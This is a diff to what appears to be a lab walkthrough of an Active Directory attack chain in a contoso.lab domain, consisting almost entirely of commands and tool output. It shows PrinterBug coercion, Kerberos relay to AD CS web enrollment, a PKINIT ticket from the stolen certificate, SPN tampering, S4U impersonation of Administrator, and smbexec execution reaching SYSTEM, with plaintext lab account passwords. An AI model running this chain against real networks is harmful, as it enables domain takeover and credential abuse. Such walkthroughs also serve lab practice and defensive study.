@@ -15,7 +15,8 @@ win-dc02.sales.contoso.lab
 # [-] Adding new record
 # [+] LDAP operation completed successfully
 
-printerbug 'sales.contoso.org'/'intrasvc':'4dmD4v1D'@'win-dc02.sales.contoso.lab' 'win-srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'
+printerbug 'sales.contoso.org'/'intrasvc':'4dmD4v1D'@'win-dc02.sales.contoso.lab' \
+'win-srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'
 
 python3 /usr/share/krbrelayx/krbrelayx.py \
 --target http://win-srv01.sales.contoso.lab/certsrv/ \
@@ -37,7 +38,11 @@ python3 /usr/share/krbrelayx/krbrelayx.py \
 # [*] Writing PKCS#12 certificate to ./unknown5766.pfx
 # [*] Certificate successfully written to file
 
-python3 PKINITtools/gettgtpkinit.py -cert-pfx ../unknown5766.pfx "sales.contoso.lab/win-dc02" win-dc02.ccache -dc-ip 192.168.1.12
+python3 PKINITtools/gettgtpkinit.py \
+-cert-pfx ../unknown5766.pfx \
+"sales.contoso.lab/win-dc02" \
+win-dc02.ccache \
+-dc-ip 192.168.1.12
 # Loading certificate and key from file
 # Requesting TGT
 # AS-REP encryption key (you might need this later):
@@ -153,15 +158,28 @@ win-dc02.sales.contoso.lab
 # [+] Found modification target
 # [+] SPN Modified successfully
 
-impacket-getST -spn 'CIFS/WIN-SRV01' \
+impacket-getST -spn 'CIFS/win-srv01.sales.contoso.lab' \
 -impersonate Administrator \
 -dc-ip 192.168.1.12 'sales.contoso.lab'/'alice':'1AM4l1c3!?1'
-# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
-# 
-# [-] CCache file is not found. Skipping...
 # [*] Getting TGT for user
 # [*] Impersonating Administrator
 # [*] Requesting S4U2self
 # [*] Requesting S4U2Proxy
-# [*] Saving ticket in Administrator@CIFS_WIN-SRV01@SALES.CONTOSO.LAB.ccache
+# [*] Saving ticket in Administrator@CIFS_win-srv01.sales.contoso.lab@SALES.CONTOSO.LAB.ccache
+
+export KRB5CCNAME='Administrator@CIFS_win-srv01.sales.contoso.lab@SALES.CONTOSO.LAB.ccache'
+
+nxc smb win-srv01.sales.contoso.lab -u Administrator -k --use-kcache
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-SRV01) (domain:sales.contoso.lab) (signing:False) (SMBv1:True)
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] sales.contoso.lab\Administrator from ccache (Pwn3d!)
+
+nxc smb win-srv01.sales.contoso.lab -u Administrator -k --use-kcache --exec-method smbexec -x 'whoami /all'
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-SRV01) (domain:sales.contoso.lab) (signing:False) (SMBv1:True)
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] sales.contoso.lab\Administrator from ccache (Pwn3d!)
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] Executed command via smbexec
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        USER INFORMATION
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        ----------------
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        User Name           SID
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        =================== ========
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        nt authority\system S-1-5-18
 ```
